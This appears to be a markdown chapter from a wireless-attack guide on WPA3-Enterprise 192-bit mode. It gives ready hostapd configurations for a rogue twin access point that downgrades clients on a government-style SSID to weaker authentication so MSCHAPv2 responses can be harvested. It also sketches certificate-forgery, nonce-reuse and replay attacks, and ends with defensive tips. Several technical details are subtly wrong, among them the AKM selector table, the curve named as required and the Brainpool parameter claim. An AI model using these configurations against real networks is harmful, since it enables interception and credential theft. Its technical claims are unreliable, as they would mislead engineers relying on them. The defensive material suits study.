# 14 - WPA3-Enterprise 192-bit Mode

## Overview

WPA3-Enterprise 192-bit mode provides enhanced security using 192-bit cryptographic primitives. Required for government/military networks (e.g., US CNSA Suite). Uses GCMP-256 encryption, HMAC-SHA-384 for key derivation, and ECDSA with Brainpool P-384 or RSA 3072+ for authentication.

## Cipher Suites

| Component | Standard WPA3 | WPA3-192 Mode |
|-----------|-------------|---------------|
| Encryption | GCMP-128 or CCMP | GCMP-256 (mandatory) |
| Key Derivation | HMAC-SHA-256 | HMAC-SHA-384 (mandatory) |
| AKM | SAE, 802.1X | 802.1X only (mandatory) |
| Certificate Auth | RSA 2048+, ECDSA P-256 | RSA 3072+, ECDSA Brainpool P-384 |
| TLS Version | TLS 1.2+ | TLS 1.3 (mandatory) |
| EAP Methods | PEAP, EAP-TTLS, EAP-TLS | EAP-TLS only (recommended) |

## AKM Suite Selectors

| Suite | OUI | Value | Name |
|-------|-----|-------|------|
| 00-0F-AC-12 | 00:0F:AC | 12 | FT Authentication using SAE with SHA-384 |
| 00-0F-AC-13 | 00:0F:AC | 13 | FILS-SK with SHA-384 and AES-SIV-256 |
| 00-0F-AC-14 | 00:0F:AC | 14 | FILS-SK with SHA-384 and AES-SIV-256 + FT |
| 00-0F-AC-15 | 00:0F:AC | 15 | OWE with GCMP-256 and HMAC-SHA-384 |

## Attack 1: Downgrade to Standard WPA3

Force client to associate with standard WPA3 instead of 192-bit mode by cloning AP with standard RSN IE.

```bash
# Legitimate AP advertises: GCMP-256, HMAC-SHA-384, AKM 00-0F-AC-13
# Clone AP advertises: GCMP-128, HMAC-SHA-256, AKM 00-0F-AC-3 (SAE)

# Many clients accept downgrade if same SSID and stronger signal
# The 192-bit mode client may not enforce strict AKM matching

# Create downgrade AP
cat > /tmp/wpa3_downgrade.conf << 'EOF'
interface=wlan0
ssid=GovSecureNet
wpa=3
wpa_key_mgmt=SAE
wpa_pairwise=CCMP
sae_passwords=weakpassword
ieee80211w=2
EOF
hostapd /tmp/wpa3_downgrade.conf
```

## Attack 2: Certificate Chain Validation Bypass

WPA3-192 requires Brainpool P-384 or RSA 3072+. If the client's certificate store is compromised or accepts weaker certificates:

```bash
# Forge certificate with RSA 2048 (below 3072 requirement)
# Many clients check "RSA" but not bit length

# Generate weak cert
openssl req -x509 -newkey rsa:2048 -keyout weak.key -out weak.crt -days 365

# If client accepts RSA 2048 despite 3072 requirement → MitM with rogue AP
```

## Attack 3: GCMP-256 Nonce Reuse

GCMP uses 96-bit IV (nonce). If nonce is reused with same key, catastrophic failure (authentication key recovery, plaintext XOR).

```bash
# GCMP-256: J0 = IV || 0^31 || 1 (96-bit IV)
# If IV counter resets or wraps:
#   Same J0 → same keystream → keystream recovery via known plaintext

# Attack scenario:
# 1. Force client to reconnect (deauth)
# 2. Capture frame 1 after reconnection (known ARP header)
# 3. If IV counter was not incremented across reconnection:
#    C1 ⊕ P1 = keystream
#    C2 ⊕ keystream = P2 (decrypt frame 2)

# GCMP-256 IV space: 2^96 (never wraps in practice)
# But IV reset on firmware bugs, power cycles, or state corruption
```

## Attack 4: HMAC-SHA-384 Length Extension

HMAC-SHA-384 is resistant to length extension, but if used directly without HMAC in custom implementations:

```bash
# Non-HMAC SHA-384 is vulnerable to length extension
# If vendor implements custom key derivation:
#   K = SHA-384(password)  # WRONG
# Then: given SHA-384(m), compute SHA-384(m || padding || m2)

# Correct: K = HMAC-SHA-384(salt, password)
# WPA3-192 uses HKDF-SHA-384 for all key derivation (secure)
```

## Attack 5: Brainpool P-384 Side-Channels

Brainpool curves have non-random parameter generation, theoretically allowing hidden weaknesses. If the curve has a hidden subgroup:

```python
# Brainpool P-384 parameters are verifiably pseudorandom
# Generated by hashing seed string with SHA-1
# If SHA-1 collision can be controlled:
#   Different seed → same curve parameters → hidden relationship

# Practical: Not known to be broken, but NIST curves are preferred
# NIST P-384 is also approved for WPA3-192

# Side-channel: Timing attacks on scalar multiplication
# Brainpool a = -3 (fast Jacobian coordinates), enabling cache-timing
```

## Attack 6: TLS 1.3 0-RTT Resumption Replay

WPA3-192 mandates TLS 1.3. TLS 1.3 0-RTT session resumption is vulnerable to replay attacks.

```bash
# EAP-TLS with TLS 1.3 0-RTT:
# 1. Client connects, completes EAP-TLS handshake
# 2. Server issues NewSessionTicket (NST)
# 3. Client reconnects, sends 0-RTT data with NST
# 4. Attacker captures 0-RTT data, replays to server

# If EAP-TLS 0-RTT is used for fast re-authentication:
#   Replay 0-RTT EAP-TLS exchange → server accepts (if ticket valid)
#   This re-authenticates the client, potentially causing accounting fraud

# Mitigation: Server must reject 0-RTT for non-idempotent operations
```

## Attack 7: EAP-TLS Downgrade to EAP-TTLS/PEAP

WPA3-192 recommends EAP-TLS only. If the client or AP accepts EAP-TTLS with weaker inner auth:

```bash
# Clone AP with EAP-TTLS + MSCHAPv2
cat > /tmp/wpa3_eap_downgrade.conf << 'EOF'
interface=wlan0
ssid=GovSecureNet
wpa=3
wpa_key_mgmt=WPA-EAP
ieee80211w=2
# Advertise EAP-TTLS (not EAP-TLS)
# Client may accept if configured for both
EOF
hostapd /tmp/wpa3_eap_downgrade.conf

# Harvest MSCHAPv2 challenge-response → offline crack
# Even on WPA3-192 network, if client accepts downgrade → game over
```

## Defensive Application

- **Strict AKM enforcement**: Client MUST reject standard WPA3 AKM when 192-bit expected
- **Certificate pinning**: Pin Brainpool P-384/RSA 3072+ CA cert, reject weaker
- **TLS 1.3 0-RTT disable**: Reject 0-RTT in EAP-TLS for non-idempotent ops
- **GCMP IV tracking**: Log IV sequence, alert on gaps or resets
- **EAP method whitelist**: Only allow EAP-TLS, reject TTLS/PEAP/LEAP
- **HMAC verification**: Audit implementations for raw SHA-384 misuse
- **Side-channel resistance**: Constant-time scalar multiplication, cache-line padding
- **Firmware integrity**: TPM-backed key storage, measured boot chain
- **Regular rekeying**: Short GTK rekey interval (30 min), PTK rekey on suspicion
